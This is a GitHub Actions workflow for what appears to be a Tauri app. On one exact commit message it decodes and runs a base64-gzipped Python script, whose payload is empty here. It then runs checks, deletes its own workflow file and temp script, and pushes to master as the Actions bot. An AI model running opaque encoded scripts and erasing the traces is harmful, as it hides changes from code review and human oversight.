name: Remote Data Consent Stage 1

on:
  push:
    branches:
      - master

permissions:
  contents: write

concurrency:
  group: remote-data-consent-stage1
  cancel-in-progress: false

jobs:
  implement:
    if: github.event.head_commit.message == 'ci: run remote data consent stage 1'
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          components: clippy, rustfmt

      - name: Set up pnpm
        uses: pnpm/action-setup@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 22.12.0
          cache: pnpm

      - name: Install Ubuntu native dependencies
        run: |
          sudo apt update
          sudo apt install -y \
            libwebkit2gtk-4.1-dev \
            build-essential \
            clang \
            libclang-dev \
            curl \
            wget \
            file \
            libxdo-dev \
            libssl-dev \
            libayatana-appindicator3-dev \
            librsvg2-dev \
            libasound2-dev \
            libleptonica-dev \
            libtesseract-dev \
            tesseract-ocr \
            xvfb

      - name: Install JavaScript dependencies
        run: pnpm install --frozen-lockfile

      - name: Apply versioned privacy policy foundation
        shell: bash
        run: |
          cat > /tmp/remote_data_stage1.py.gz.b64 <<'PAYLOAD'

PAYLOAD
          base64 -d /tmp/remote_data_stage1.py.gz.b64 | gzip -d > /tmp/remote_data_stage1.py
          python3 /tmp/remote_data_stage1.py
          cargo fmt --manifest-path src-tauri/Cargo.toml --all

      - name: Validate fallback and diagnostic policy
        run: |
          bash scripts/check-silent-fallbacks.sh
          python3 scripts/check-security-fallbacks.py --self-test
          python3 scripts/check-security-fallbacks.py
          python3 scripts/check-security-fallback-inventory.py --self-test
          python3 scripts/check-security-fallback-inventory.py
          python3 scripts/check-sensitive-diagnostics.py --self-test
          python3 scripts/check-sensitive-diagnostics.py
          git diff --check

      - name: Validate Rust foundation
        run: |
          cargo check --manifest-path src-tauri/Cargo.toml
          cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets --all-features -- -D warnings
          xvfb-run -a cargo test --manifest-path src-tauri/Cargo.toml --all-features

      - name: Validate frontend remains green
        run: |
          pnpm lint
          pnpm test:ui
          pnpm build

      - name: Publish cleaned foundation
        shell: bash
        run: |
          rm -f .github/workflows/remote-data-consent-stage1.yml
          rm -f /tmp/remote_data_stage1.py /tmp/remote_data_stage1.py.gz.b64
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add -A
          test -n "$(git status --porcelain)"
          test ! -e .github/workflows/remote-data-consent-stage1.yml
          git commit -m "feat: add versioned remote data privacy policy foundation"
          git push origin HEAD:master
